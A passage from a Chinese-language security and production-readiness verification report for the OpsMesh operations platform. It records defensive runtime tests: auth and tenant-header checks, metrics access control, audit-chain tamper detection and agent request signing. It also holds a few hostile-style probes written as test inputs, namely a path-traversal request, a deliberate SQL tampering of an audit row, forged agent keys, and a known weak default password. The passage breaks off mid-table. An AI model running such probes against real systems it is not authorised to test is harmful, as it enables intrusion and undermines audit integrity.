### 阶段三：可销售（约 10–20 人天 + 法务）
目标是「采购、法务、安全评审能过」。

- P1-7 THIRD_PARTY/NOTICE 清单 + MPL 声明 + 明确 Apache-2.0 的再分发含义（是否引入商业许可/EULA 需你决策）（3–5 pd + 法务）
- ~~P1-3 审计防篡改（hash 链或外部 WORM 归档）+ 保留/归档任务 + `(tenant_id, created_at)` 复合索引（3–5 pd）~~ ✅ 2026-09-25（WORM 外部锚定仍为已知边界，见 §3 P1-3 与 `docs/security-mechanism.md` §7.7）
- 企业级能力补齐（按目标客户取舍）：SSO/LDAP/OIDC、真实 HA failover（当前 `handleHAFailover` 为 no-op 返回 `"simulated": false`）、白标、离线安装包 —— 约 20–30 pd，**建议与首个客户的真实需求挂钩后再投入**，不要预先建设。

### 阶段四：规模化（按需）
- ~~P1-2 per-agent 凭证 + 签名覆盖载荷（5–8 pd）~~ ✅ 2026-09-25（已提前至阶段二收口，见 §13）
- 双轨架构收敛决策落地
- 首次真实负载测试（当前仓库内**无任何压测结果**，而每 agent 2s 一次的取消轮询意味着 1000 agent ≈ 500 req/s 的固定开销，应实测确认）

---

## 7. 与既有评估报告的关系（重要）

`docs/evaluation-report.md` 的结论是「35/35 已修复、0 遗留、生产可用，但有 8 项高风险需修复」。本报告需要指出三点：

1. **它的「生产可用」结论未经运行验证。** 35 项修复全部集中在代码质量、文档一致性、Operator 安全配置等**静态维度**，而本次发现的 6 个 P0 全部是**动态/配置维度**——它们只有在真正以生产参数启动产品时才会暴露。这解释了为什么「35/35 已修复」与「生产模式登不进去且可被接管」可以同时成立。
2. **它有一处结论被实测证伪**：第 7 章安全评估将预置弱口令判为「被强制改密机制中和」。实测表明该机制不阻止用已知旧口令改密并取得会话（见 P0-1）。
3. **它修复的同类问题出现回归**：`evaluation-report.md` H2 专门修复过「注释与实现不符」，但本次仍发现同类漂移——`dashboard.go:13` 称个人版「已收敛为极简引导页」，实为 35KB／19 个 tab 的完整 SPA；`stub_guard.go`/`config.go` 注释引用 `sql_p01.go ~ sql_p06.go`，**这些文件不存在**（真实实现为 `sql_ticket.go`/`sql_slo.go` 等按域命名）。**说明「文档漂移」不是一次性修复项，而是需要 CI 持续守住的机制**（建议：把注释中引用的文件名纳入 CI 存在性校验）。

---

## 8. 交付建议

**不要在当前状态下启动正式商用销售。** 但也不需重写——这个项目的底盘是好的：

- 6 个 P0 里，P0-1、P0-2、P0-4 是**配置与文档级**问题，修复成本低（**P0-1、P0-2 已完成，合计 3–6 人天**；P0-4 剩 5–8 人天）而收益极高；
- P0-6 与 P0-5 是**真实缺陷**，但定位精确、改动集中（约 15–25 人天）；
- P0-3 是**交付包装**问题。

**建议路径**：先用 2–3 周完成阶段一，然后**做一次真实客户环境的落地试用**（推荐 1 个网段 / 20–50 台设备），用它来校验阶段二、三的优先级。在完成阶段一之前，任何「生产可用」的对外表述都应撤下——尤其是 `DELIVERY.md` §3 的「全量验证结果 ✅」表格，它验证的是 `go build/vet/test`，与产品能否交付无关。

---

*本报告所有结论均基于对 `F:\Nexus\OpsMesh`（commit `2c87a0b`）的只读静态分析 + 二进制实际运行验证。报告中标注的文件行号在评估时点有效。评估阶段未修改任何项目文件；测试用的临时二进制、证书与进程已全部清理。*

*后续修复实施（P0-1、P0-2，2026-09-25）已改动仓库代码与部署资产，改动清单见 §2 各节「修复交付物」；验证方式均为「编译 → 真机黑盒 → 回归测试全绿」三段式，不依赖静态推断。*

---

## 9. 真机全栈验证记录（2026-09-25，P0-1 / P0-2 / P0-4 / P0-7 收口验收）

> 本节回答的是「修复到底有没有真的交付」。所有数字来自真机执行，命令可复现；断言脚本随仓库交付
> （`deploy/scripts/verify-runtime.sh`，只读、退出码即结论），不依赖评估者本机环境。

### 9.1 被测对象与执行方式

| 项 | 值 |
|---|---|
| 被测量 | `deploy/docker/docker-compose.prod.yml`（生产形态：HTTPS + 加密密钥 + 强口令 + 微服务独立库） |
| 启动命令 | `bash deploy/docker/scripts/deploy.sh up -y`（`-y` = 非交互确认端口占用；占用方即上一次部署的本栈） |
| 启动结果 | **退出码 0**；耗时约 12 分钟（含 10 个镜像重建：控制面 + 9 个微服务）；`[ERROR]` 计数 0 |
| 独立复验 | `bash deploy/scripts/verify-runtime.sh` → **PASS=38 FAIL=0**（退出码 0） |
| 静态门禁 | `bash deploy/scripts/validate-deploy-assets.sh` → **PASS=20 FAIL=0** |
| 冒烟测试 | `deploy.sh` 内置冒烟全绿，含本轮新增的「Prometheus 采集目标全 UP」断言 |

### 9.2 容器矩阵与端口真实性（P0-4 验收）

17 个容器全部 Up（15 个 healthy；`grafana`、`otel-collector` 未定义 healthcheck，由宿主侧 HTTP 探活确认）：

```
aio-svc healthy   alert-svc healthy   auth-svc healthy   blackbox-exporter healthy
config-svc healthy controlplane healthy device-svc healthy gpu-svc healthy
log-svc healthy   loki healthy        mysql healthy      portal-svc healthy
prometheus healthy redis healthy      task-svc healthy   grafana Up   otel-collector Up
```

**关键回归断言**：逐个容器核对 `HostConfig.PortBindings` 与 `NetworkSettings.Ports`，
**没有任何容器「声明了宿主端口却未真实发布」**——这正是本轮定位的 `internal: true`
静默丢弃缺陷的直接探针；缺陷态下会命中 13 个容器 / 15 个端口（见 §2 P0-4 对照实验）。

### 9.3 控制面入口与鉴权链路（P0-1 / P0-2 验收）

| 断言 | 结果 |
|---|---|
| `GET https://127.0.0.1:8080/healthz` | 200（TLS 生效） |
| 明文 `http://…:8080/healthz` | HTTP 400（被 TLS 层拒绝，未进入业务处理）——**不是** 2xx |
| 错误口令登录 | 401 |
| 预置弱口令 `admin123` 登录 | **401**（P0-1 主断言） |
| 正确初始口令登录 | 200 且 `mustChangePassword=true` + 一次性 `changePasswordToken` 齐备 |
| 强制改密期间的会话凭证 | 响应中 `token` 字段为**空字符串**（`docs/operations.md` 承诺「改密前不签发正式 token」——实测吻合）；用该空 token 访问 `/api/v1/devices`、`/api/v1/tasks`、`/api/v1/alerts` 均返回 **401** |
| `X-Tenant-ID` 伪造 | 401（越权头未被信任） |

### 9.4 持久化落库（P0-7 验收）

```
库清单：opsmesh / opsmesh_device / opsmesh_task / opsmesh_alert / opsmesh_config / opsmesh_log
opsmesh          54 张表（users/devices/tasks/audit_log/…）
opsmesh_device    5 张表   opsmesh_task 2 张表
opsmesh_alert     3 张表（alert_rules / alerts / silences）      ← 修复前：0 张表
opsmesh_config    5 张表（config_entries / config_history / …）  ← 修复前：0 张表
opsmesh_log       0 张表（log-svc 按设计走 loki 后端，非缺陷，登记以免误判）
关键表可查：opsmesh.users=3 行；opsmesh_alert.alerts 可查；opsmesh_config.config_entries 可查
```

`opsmesh_alert` / `opsmesh_config` 从「零表」变为「建表成功且可查询」，即 P0-7 的端到端证据：
这两个服务确实跑在 MySQL 上，而不是静默退回内存。

### 9.5 监控真实性（假告警修复验收）

- Prometheus 活动采集目标 **9 个，UP=9 / DOWN=0**，其中 mysql / redis 两个 job 经
  `blackbox-exporter:9115/probe?module=tcp_connect` 探活：
  `target=mysql%3A3306`、`target=redis%3A6379` 均为 `up`。
- 告警接口：**firing=0 / pending=0**（修复前为 5 条常驻 critical 假告警）。

### 9.6 负向验证（证明修复不是「恰好通过」）

| 负向用例 | 期望 | 实测 |
|---|---|---|
| `ALERT_SVC_STORE_TYPE=sql` + 非法 DSN 启动 alert-svc | 拒绝启动 | **EXIT=1**，日志 `MySQL store 初始化失败，停止启动: open mysql: invalid DSN: …`（修复前：打一行日志后以内存存储继续服务） |
| 把 `ensureParseTime` 还原为旧实现后跑 `dsn_test.go` | 测试变红 | 变红（证明测试有守护力，非恒真） |
| 门禁负向：人为给带宿主端口的服务挂 `internal: true` 网络 | 门禁失败并点名 | 门禁 FAIL，点名 8 个服务（`validate-deploy-assets.sh` §4 不变式） |
| 明文 HTTP 断言 | 只接受连接层拒绝或 TLS 层拒绝 | 断言显式接受 `000`/`400`，仅 1xx/2xx/3xx 判回归——避免把「Go TLS 服务器的 400 标准回应」误判为漏洞 |

### 9.7 本轮未修的运行时观察（如实记录，非阻断）

1. `GET https://<controlplane>:8080/metrics` **无需鉴权即返回 200**，暴露 `opsmesh_devices_total` /
   `opsmesh_tasks_total` / `opsmesh_alerts_active` / `opsmesh_tickets_open` 等聚合计数（对应 §3 P1-5 面）。
   建议：默认只绑 loopback 或加抓取白名单 + 限流。
2. ~~登录在 `mustChangePassword=true` 时仍同时下发会话 token~~ —— **已实测排除**：`token` 字段为空串，
   空 token 访问业务接口一律 401，与 `docs/operations.md` 的承诺一致（本报告初稿的此条为脚本误判：
   脚本原先只匹配键名，未判值是否非空；断言已改为「非空 token 才判失败」）。
3. ~~控制面工厂 `internal/controlplane/factory/server_factory.go` 对 M3/M5 子存储仍保留「构造失败退内存」的路径（§3 P1-8）。~~ —— **已修**：生产模式改为 fail-fast（见 §10.5）。

---

## 10. 真机全栈验证记录（2026-09-25 第二批：P0-3 / P0-5 / P0-6 / P1-8 收口验收）

第二批修复的验收标准与第一批一致：**以真机把生产栈跑起来为准，不以静态结论收口**。

### 10.1 被测对象与执行方式

```
交付物重建：docker compose -f docker-compose.prod.yml build controlplane   → EXIT=0
            （含新增 node:22-alpine 构建阶段；npm ci + npm run build + test -f dist/index.html 全过）
全栈重部署：bash scripts/deploy.sh up -y                                   → EXIT=0
            17 容器全 Up/healthy；构建 15 个服务镜像后重新拉起；冒烟测试（含 gRPC TLS 握手）通过
独立断言：  bash deploy/scripts/verify-runtime.sh                          → PASS=58  FAIL=0
静态门禁：  bash deploy/scripts/validate-deploy-assets.sh                  → PASS=20  FAIL=0
```

### 10.2 企业版前端交付（P0-3 验收）

镜像内已真实内置企业版前端（非占位），逐项实测：

| 断言 | 实测 |
|---|---|
| `GET https://127.0.0.1:8080/enterprise/` | **200**，`Content-Type: text/html; charset=utf-8`，`Cache-Control: no-cache, no-store, must-revalidate`，CSP 含每请求 nonce |
| 是否占位页 | 响应头**无** `X-OpsMesh-Enterprise-Bundle: placeholder`，body **无** `OPSMESH_ENTERPRISE_BUNDLE_PLACEHOLDER` → 真实构建产物 |
| SPA 入口引用的资源 | `/enterprise/assets/js/index-DZhQRfLW.js` → **200** |
| `assets` 缓存策略 | `Cache-Control: public, max-age=31536000, immutable` |
| 预压缩协商（br） | `Content-Encoding: br` + `Vary: Accept-Encoding`，**9189B**（未压缩 37430B，压缩率 75%） |
| 预压缩协商（gzip） | `Content-Encoding: gzip`，**10640B**（未压缩 37430B） |
| SPA 深链回退 | `GET /enterprise/devices` **200**，与外壳响应体 **md5 逐字节一致**（`711f142a…`） |
| 缺失分包 | `GET /enterprise/assets/__missing__.js` → **404**（未回退 HTML） |
| 路径穿越 | `--path-as-is /enterprise/assets/../../healthz` → **307**（被 ServeMux 归一，未命中前端资源） |
| 个人版引导页入口 | `GET /` 响应含 `href="/enterprise/"` 且无标记残留 |

### 10.3 迁移安全（P0-5 验收）

| 断言 | 实测 |
|---|---|
| 库内版本 vs 磁盘迁移文件 | `schema_migrations` 最大版本 **18** == 磁盘迁移文件 **18** 个 → 无漏跑 |
| 防篡改基线 | 18 条已应用迁移的 `checksum` **均非空** |
| 回滚脚本齐备 | `up=18 / down=18`（每个迁移随附 `.down.sql`） |
| 真实 MySQL 集成测试 | 库内 13 个迁移集成测试 **13/13 通过**（`TestRunMigrations*` / `TestMigrationLock_ExcludesOtherSession` / `TestRunMigrations_ConcurrentStores` / `TestMigrationDownScripts_UnwindChain` 整链回滚等） |
| 全套带 DSN 的分支 | `internal/store`(375s) / `internal/controlplane`(50s) / `internal/logstore` / `pkg/auth` 全绿 → EXIT=0 |

### 10.4 多租户隔离（P0-6 验收）

| 断言 | 实测 |
|---|---|
| `users.tenant_id` 列 | 存在；**历史行已回填**（空租户用户数 = 0） |
| `tasks.tenant_id` 列 | 存在（领取侧 SQL 租户过滤可生效） |
| 伪造租户头 → 设备列表 | 仅带 `X-Tenant-ID: attacker-tenant`：**401** |
| 伪造租户头 → 用户管理 | 仅带 `X-Tenant-ID: attacker-tenant`：**401** |
| JWT 携带租户 | `tenant_users_test.go:205` 断言登录签发的 JWT 经 `tenantFromBearer` 解出正确租户（随带 DSN 的 controlplane 全量测试通过） |

### 10.5 P1-8（M3/M5 子存储失败不再静默降级）

工厂在生产模式下对 M3/M5 子存储构造失败改为 fail-fast，与 `--production` / `StoreType=sql` 的既有阻断先例一致；`server_factory_test.go` 覆盖两分支。

### 10.6 本轮自查抓到并修复的缺陷（说明断言不是橡皮图章）

**gzip 预压缩旁路静默失效**：`negotiatedEncoding` 返回的编码名被直接当作旁路文件后缀拼接，
gzip 分支去找 `x.js.gzip`（实际文件是 `x.js.gz`）→ 未命中 → 静默退回**未压缩原文**。
服务端仍返回 200、无任何错误码，只表现为传输体积翻约 3.5 倍——正是「看起来通过、实际没生效」的典型。

- **发现方式**：不是静态读代码，而是对同一 URL 做 `identity` / `br` / `gzip` 三种 `Accept-Encoding`
  的**体积与 `Content-Encoding` 双比对**。
- **修复**：`negotiatedEncoding` 改为返回 `(encoding, suffix, ok)` 两个独立值（头值 `gzip` ≠ 后缀 `gz`）。
- **加固**：单元测试补 gzip 头值/后缀映射、已压缩路径不二次协商、旁路体必须小于原文；
  运行时脚本对 `br` 与 `gzip` 逐编码断言「声明了对应编码 **且** 体积确实变小」。
- **修复后实测**：`br 9189B / gzip 10640B < 未压缩 37430B`，两者均带正确 `Content-Encoding`。

### 10.7 本轮清理（不留测试残留）

- 为跑真实 MySQL 集成测试临时创建的 `migtest` 库用户**已删除**（`mysql.user` 中已无此用户），
  临时库 `test_migration_*` 已全部 DROP（`information_schema.schemata` 中 0 条）。
- 企业版前端构建产物落在 `internal/controlplane/embed/enterprise/`，由嵌套 `.gitignore`
  白名单化（仅 `placeholder.html` + `.gitignore` 入库），`git status -uall` 该目录下**仅这两个文件**，
  构建产物不可能被误提交。

---

## 11. 真机全栈验证记录（2026-09-25 第三批：P1-1 / P1-4 / P1-5 收口验收）

执行方式：`bash deploy/docker/scripts/deploy.sh up -y`（全量重建 17 容器，冒烟测试通过）
→ `bash deploy/scripts/verify-runtime.sh`（断言脚本已扩容至 **69 项，PASS=69 / FAIL=0**）
→ 另加一次性探针容器的定向负向实验（见 11.3）。

### 11.1 P1-5 指标 DoS 收敛（四层修复的逐项实证）

| 断言 | 实测结果 |
|---|---|
| 宿主 8080 `GET /metrics` | 200（来源落在 `METRICS_ALLOW_CIDR` 内） |
| 9091 `GET /metrics`（Prometheus 抓取路径） | 200，303 行；Prometheus target `controlplane:9091` = `up` |
| `opsmesh_http_metrics_series` | 16（硬上限 2000 内，且随请求数线性增长已不可能） |
| `opsmesh_http_metrics_series_dropped_total` | 已暴露（超限请求可观测，用于「本端点正被扫描」告警） |
| 请求 `/api/v1/<66 字节随机段>` | 归一为 `path="/api/v1/:id"`；原始 66 字节串**未出现**在指标文本中（无标签膨胀） |
| 请求 `/<221 字节路径>` | 归一为 `path="/:overlong"` |
| 生产默认限流启动日志 | `[config] 提示：生产模式默认启用 API 限流 200 req/s/IP` + `API 限流已启用 ratePerSec=200` |
| 限流突发实测 | 单连接复用连打 800 次 `/api/v1/devices` → **429=429、非 429=371**（令牌桶生效） |
| fail-closed 负向验证 | 探针容器白名单=127.0.0.1/32 → **403**，拒绝日志 `msg=metrics 访问被拒（不在 CIDR 白名单） remote=172.28.1.1:40360` |

### 11.2 断言自身的假阴性（自查记录）

首轮 3e 限流断言用 `xargs -P 80` 逐请求起 `curl` 进程打 1500 次突发，结果**无一 429**。
排查后确认不是限流未生效，而是 Windows 上进程创建开销把实际速率压到 ~200 req/s 边界
（对照实验：单条 curl 复用 keep-alive 连接连打 600 次耗时 0.80s，其中 273 次 429）。
断言已改为单连接突发（800 次），并把这条「假阴性」写进脚本注释——避免后人重踩。

### 11.3 部署形态边界（实测发现，需在交付文档中如实说明）

Docker Desktop(WSL2) 的端口转发**不保留真实来源 IP**。用一次性探针容器（白名单仅 `127.0.0.1/32`）
做对照实验，三种来源在容器侧观察到的 `remote` 均为 **172.28.1.1**（frontend 网桥网关）：

| 来源 | 结果 |
|---|---|
| 宿主 `curl http://127.0.0.1:29191/metrics` | 403，`remote=172.28.1.1:51578` |
| 宿主经局域网 IP `http://192.168.10.201:8080/metrics` | 对被测栈返回 200（来源同为网关，落在 172.28.0.0/16 内） |
| 默认桥容器经 `host.docker.internal:9091/metrics` | 200（同上） |

结论（已写入 `docker-compose.prod.yml` 注释与 `docs/operations.md`）：
1. `METRICS_ALLOW_CIDR` 必须包含 `172.28.0.0/16`，否则**连宿主都抓不到**（探针实验已证）；
2. 该部署形态下 CIDR 白名单**不具备来源区分能力**，真正的边界是「端口只发布到 `127.0.0.1`」+ 宿主防火墙；
   来源区分只在裸机/systemd（真实 IP 保留）与 K8s（Pod IP）部署下成立；
3. 因此本次修复把「生产模式空 CIDR = fail-closed」设为默认，避免客户以为配了白名单就等于有边界。

### 11.4 静态门禁与单元测试

- `deploy/scripts/validate-deploy-assets.sh`：**PASS=20 / FAIL=0**（含 Helm 渲染后新参数
  `--metrics-allow-cidr` / `--cb-rate-limit-per-sec` 的出现性校验）。
- `go test ./internal/agent/ ./internal/store/ ./internal/metrics/ ./internal/config/ ./internal/controlplane/`：全绿
  （agent 53.1s、store 39.6s、controlplane 40.6s；`-race` 因 Windows 无 cgo 未启用，已在报告中注明）。

---

## 12. 真机全栈验证记录（2026-09-25 第四批：P1-3 收口验收）

执行方式：重建控制面镜像（本地 11:28，晚于本批最后一次源码改动 11:21，避免验到旧二进制）
→ `bash deploy/docker/scripts/deploy.sh up --no-build -y`（复用已建镜像，17 容器就绪）
→ `bash deploy/scripts/verify-runtime.sh`（断言已扩容至 **86 项，PASS=86 / FAIL=0**）
→ 另加**在线篡改—自检—告警—恢复**全周期实证（12.4）。

### 12.1 落库与迁移（迁移 019 生效）

| 断言 | 实测结果 |
|---|---|
| `schema_migrations` 最高版本 | `19`，checksum `05ad9446cc5751a9…`（与仓库内 `019_audit_chain.sql` 一致） |
| `audit_log` 链式列 | `prev_hash` / `entry_hash` 均存在 |
| 新增表 | `audit_chain_head`（单行 id=1）、`audit_log_archive`、`audit_archive_meta` 均建 |
| 新增索引 | `idx_audit_tenant_created`（(tenant_id, created_at) 复合）、`idx_audit_entry_hash` |
| 控制面启动参数 | `--audit-retention-days=180`（来自 `.env` 的 `AUDIT_RETENTION_DAYS`，证明 `.env → compose → flag` 全链路接线） |
| 在线库现状 | `audit_total=26`、`chained=11`、`legacy=15`、`archived=0`（保留期 180 天，无超龄行可归档） |
| 链头一致性 | `audit_chain_head.last_hash == 最新链式行 entry_hash` → `1` |

`legacy=15` 为迁移 019 之前写入的历史行，**如实计数不伪造**：自检把它们计为未纳链遗留，
断言脚本对其给 `[WARN]` 而非 `[PASS]`，避免「全绿」掩盖存量数据未纳链的事实。

### 12.2 静态门禁与单元测试（真实 MySQL 8.0.46）

- `gofmt -l internal/store/` 空、`go vet ./internal/store/` 无输出。
- `OPSMESH_TEST_MYSQL_DSN=… go test ./internal/store/ -count=1`
  → **`ok github.com/Levango7/OpsMesh/internal/store 176.791s`，exit 0**（全量含 8 个审计链集成用例）。
- 审计链集成用例改为共享临时库（`TestMain` 统一回收）后，8 个用例合计由 93.7s 降至 **11.4s**，
  避免 CI `-race -timeout 900s` 预算被单包吞掉；运行后 `SHOW DATABASES` 无 `test_auditchain_*` 残留。
- 淘汰/缓冲上限用例 `-count=5` 连跑确定性通过（见 12.5 第 1 条）。
- `promtool check rules /etc/prometheus/alerts.yml` → **SUCCESS: 12 rules found**（含新增审计链告警组）。

### 12.3 `verify-runtime.sh` 第 13 节（P1-3 专项断言，逐条实测）

```
=== 13. 审计链防篡改与保留策略（P1-3 回归） ===
  [PASS] audit_log 已落 prev_hash/entry_hash 链式列
  [PASS] 表 audit_chain_head 已建
  [PASS] 表 audit_log_archive 已建
  [PASS] 表 audit_archive_meta 已建
  [PASS] audit_log.idx_audit_entry_hash 已建（链式窗口查询不全表扫）
  [PASS] audit_chain_head 单行链头就绪（多副本串行化基线）
  [PASS] 最新审计行已带 entry_hash（运行期链式写入生效）
  [PASS] 链头 last_hash == 最新链式行 entry_hash（链头跟随，尾部未被删改）
  [WARN] 有 15 条链前遗留行（迁移 019 之前写入，未纳入链，自检会如实计数）
  [PASS] 控制面已接线保留策略（audit-retention-days=180）
  [PASS] GET /api/v1/audit/verify 未认证 → 401（端点已注册且受鉴权保护）
  [PASS] 指标 opsmesh_audit_chain_supported 已暴露
  [PASS] 指标 opsmesh_audit_chain_ok 已暴露
  [PASS] 指标 opsmesh_audit_chain_checked_rows 已暴露
  [PASS] 指标 opsmesh_audit_chain_checks_total 已暴露
  supported=1 ok=1 checked_rows=10 checks_total=1
  [PASS] 链自检已实际执行（checks_total=1，leader 循环在跑）
  [PASS] 存储后端支持链式校验（supported=1）
  [PASS] 链自检结论自洽（ok=1）
```

### 12.4 在线篡改—自检—告警—恢复全周期实证（本轮最强证据）

不经任何测试夹具：直接改写**在线库**一行已纳链审计记录的内容，观察**已部署二进制**的
leader 后台自检（60s 周期）能否发现、定位、导出指标、触发告警，再恢复并确认自动复原。

目标行：`id=26`（`action=user_login`，原 `detail='username=admin'`，无引号等特殊字符，便于精确还原）。

| 动作时刻（UTC） | 动作 | 观测时刻与结果 |
|---|---|---|
| （篡改前一次抓取） | 取基线 | `ok=1 supported=1 checked_rows=11 checks_total=2` |
| 03:31:32 | `UPDATE audit_log SET detail='username=admin_TAMPERED' WHERE id=26` | — |
| 03:32:47 | 等下一个自检周期（60s） | `ok=1 → 0`，`checks_total → 3`；控制面 ERROR 日志：`first_bad_id=26`、`reason="id=26 的 entry_hash 与内容重算结果不一致（行内容被改写）"` |
| 03:32:55 | 还原 `detail='username=admin'`（长度 14，与原值一致） | 03:34:10 `checks_total → 5`、`ok → 1`，其后 90s 内无新告警日志 |
| 03:34:20 | 二次篡改（验证告警通道，需跨越 `for: 5m`） | 03:35:17 Prometheus 记为 `activeAt`（规则进入 pending） |
| 03:41:26 | 等满 5 分钟后观测 | 03:41:20 状态 **firing**，`severity=critical`（`/api/v1/alerts` 仅此 1 条） |
| 03:41:26 | 还原并等待 90s | 03:42:56 `ok=1`、`checks_total=14`；`/api/v1/alerts` → **firing/pending 告警数 0**（自动恢复） |

结论：**防篡改不是静态配置，而是可复现的运行时行为**——改写一行即被定位到具体 `id`，
指标翻转、critical 告警触发，恢复后自动收敛。目标行已精确还原，收尾状态
`audit_total=26 / chained=11 / legacy=15 / archived=0`、链头与最新链式行一致（=1）。

### 12.5 本轮自查抓到并修复的缺陷（说明断言与测试不是橡皮图章）

1. **P1-4 设备指标淘汰使用墙钟排序 → 淘汰不确定**（生产代码缺陷，非测试问题）。
   全量 store 套件暴露 `TestStoreDeviceMetrics_RecentlyWrittenSurvives` 间歇失败：
   `lastWrite` 取自墙钟，Windows 上 `time.Now()` 粒度约 15.6ms，同一 tick 内多个条目并列，
   淘汰顺序退化为 Go map 随机遍历。修复：引入单调原子序号 `writeSeq`（`atomic.Uint64`）
   作为淘汰依据，与墙钟彻底解耦；文件 `internal/store/memory_bounds.go`、
   `memory_middleware_template.go`、`memory.go`。
2. **同用例的断言前提本身是错的**（测试缺陷）。旧写法在「灌满 > 刷新 veteran」的顺序下，
   按 LRU 语义 veteran 本就该被淘汰——旧实现只是靠时钟并列「侥幸通过」。已重写为语义正确的
   场景（预载 `maxTrackedDeviceMetrics-10` → 刷新 veteran → 再写 20 个 → 断言 veteran 存活、
   `d-0` 被淘汰、总数不超过上限）。
3. **告警规则升级后静默不生效**（交付/运维缺陷）。`alerts.yml` 以 bind mount 注入，
   容器未重建时 Prometheus **不会**自动重读：实测新增的 `opsmesh_audit_chain_alerts` 组
   一直未加载，手动 `POST /-/reload` 后才出现（`--web.enable-lifecycle` 已开启）。
   修复：`deploy.sh` 的 `start_observability()` 在 Prometheus 就绪后自动热加载，
   失败则显式 WARN——否则客户升级后新旧规则混用而无任何提示。
4. **多租户冒烟用例在真实库留下残留库**（测试卫生）。`TestMultiSchemaSmoke_MySQLDSNBranch`
   创建的 `opsmesh_tenant_sqlsmokea/b` 从不回收，历次运行持续堆积。已加 `t.Cleanup`
   按 namer 反推库名并 `DROP DATABASE`，实测跑完 `SHOW DATABASES` 已归零。

### 12.6 本轮未覆盖 / 诚实边界

- **未在在线栈上取得已认证的 200/409 响应**：三个种子用户（admin/operator/viewer）均处于
  P0-1 的「首登强制改密」态，无可用会话 token；为不改动交付态口令（会让断言脚本第 4 节的
  `mustChangePassword=true` 期望失效），未走改密流程换取 token。该端点的 200/409/501/500
  分支由 handler 单测 + 真实 MySQL 集成用例覆盖，在线仅断言了 401 鉴权门；平台级
  「定位首个坏行」的语义则由 12.4 的后台自检端到端证明（同一 `VerifyAuditChain` 代码路径）。
- **告警仅在 Prometheus 内 firing，未接 Alertmanager**：仓库 compose 中 Alertmanager 仍为
  可选未启用（注释保留），故「触发告警」止于 Prometheus 规则状态，未验证到邮件/webhook 投递。
- **无密钥链的固有边界**：持 DB 写权限者可重写整条链并重算全部 `entry_hash`（无 WORM/外部锚定）。
  本批如实写入 `docs/security-mechanism.md` §7.7，未内置外部锚定。
- `-race` 仍因 Windows 无 cgo 无法本地启用；CI integration job 已在 MySQL 8 + Redis 上带 `-race` 跑 store 包。

---

## 13. 真机全栈验证记录（2026-09-25 第五批：P1-2 收口验收）

执行方式：以本批**最终源码**重建控制面镜像 → `bash deploy/docker/scripts/deploy.sh up -y`（17 容器全 Up，
冒烟测试通过）→ `bash deploy/scripts/verify-runtime.sh`（断言已扩容至 **94 项：PASS=94 / FAIL=0**）
→ `bash deploy/scripts/validate-deploy-assets.sh`（**PASS=20 / FAIL=0**）
→ 真实 MySQL 8.0.46 上 `internal/store` 全量套件 → 另加 agent 侧五组端到端实测（13.1–13.5）。

> 顺序说明：先完成全部源码改动（含 13.6 / 13.7 两项实测发现的缺陷修复）并重建部署，再跑断言脚本——
> 上文的 94 项与 20 项均取自**冻结后的最终代码**，不存在「验完又改」的时间差。

### 13.1 per-agent 密钥下发与落盘

| 断言 | 实测结果 |
|---|---|
| 全新纳管（一次性 install token + TLS） | 注册响应 `signed=true`、`keySource=register-response` |
| 密钥落盘 | `<dataDir>/agent.key` **64 字节**（该文件在重启后仍被沿用，见 13.4） |
| agent 侧错误 | `level=ERROR` 计数 **0** |
| 库内 per-agent 密钥 | `agents` 表 5/5 行 `secret` 非空（断言脚本 14c 实测） |

### 13.2 签名覆盖载荷（端到端 + 负向）

- **正向**：签名 agent 领取并执行真实 shell 任务 `task-1790322380049322603` → 经
  `GET /api/v1/tasks/{id}/result` 黑盒读取结果 `exit: 0`、`stdout: 'p12-signed-result-ok'`。
- **指标结构**：`opsmesh_agent_signature_verifications_total{alg="v2",result="ok"}` 随流量增长
  （收口复跑 **185**）；`alg="v1"` 恒 **0**、`source="fleet"` 恒 **0**、`source="per_agent"` 与 `v2/ok` 同值
  ——即全部业务流量走 **per-agent 密钥 + 覆盖载荷的 v2**。
- **负向（错密钥）**：`p12-badkey`（已知 agentID + 伪造 `agent.key=deadbeef…`）启动后 18 秒内，
  控制面 `v2/rejected` 由 **0 → 11**，agent 侧 `心跳 ok` 计数 **0**、错误串
  `Unauthenticated desc = agent-signature mismatch: HMAC verification failed`（心跳/领任务/取消轮询全被拒）。
  - **诚实说明**：更早一轮曾在旧镜像上测到 `v2/rejected` 0→20，但该计数随容器重建归零；为不把
    「上一轮读数」当成本轮证据，此处在本批最终代码上**重跑了同一条负向用例**取数。

### 13.3 任务子进程环境隔离（端到端）

任务 `task-1790322380202017385` 的 cmd 为 `echo OPSKEY=[%OPSMESH_GRPC_SIGNATURE_KEY%] CANARY=[%P12_ENV_CANARY%] USER=[%USERNAME%] HOME=[%USERPROFILE%]`，
实测 `exit: 0`、`stdout`：

```
OPSKEY=[%OPSMESH_GRPC_SIGNATURE_KEY%] CANARY=[%P12_ENV_CANARY%] USER=[winge] HOME=[C:\Users\winge]
```

- 前两项**未被展开** = 这两个变量在任务子进程环境里根本不存在（修复前 `set` 可直接读到 agent 全量环境）。
- 后两项正常展开 = 白名单未误伤运行必需变量；`USERNAME` 的补入由此实测确认（补入前 `%USERNAME%` 输出字面量）。

### 13.4 重启身份连续性（已消费 install token）

杀掉 agent 进程后原样重启（`<dataDir>/install.token` 129 字节仍在，且已被首轮注册消费）→
注册成功、`signed=true`、`keySource=agent.key`、`ERROR` 计数 0；控制面打印限次 WARN
「install token 已消费或失效，按已知 agent 重注册处理（沿用库内租户、不下发密钥）」。
即：修复前该场景 agent 会 fail-fast 退出，纳管机器重启即永久失联。

### 13.5 断言脚本第 14 节（8 条，逐条实测）

| # | 断言 | 实测 |
|---|---|---|
| 14a | 交付资产已接线签名验证 | `OPSMESH_GRPC_REQUIRE_SIGNATURE=true` |
| 14b-1 | 验签指标全标签集（8 条时序，含 0 值） | PASS |
| 14b-2/3 | 密钥来源指标 `source=per_agent` / `source=fleet` | PASS |
| 14b-4 | 已有 agent 用 v2 通过验签 | `v2/ok=185` |
| 14b-5 | 无 v1 遗留算法流量 | `v1/ok=0` |
| 14b-6 | 无全舰队预共享密钥兜底 | `source="fleet"=0` |
| 14c | 已注册 agent 持 per-agent 密钥 | 5/5 |

### 13.6 本轮实测发现并修复的 **P0 级可用性缺陷**：agent 通道被租户门禁全量拒绝

| 项 | 内容 |
|---|---|
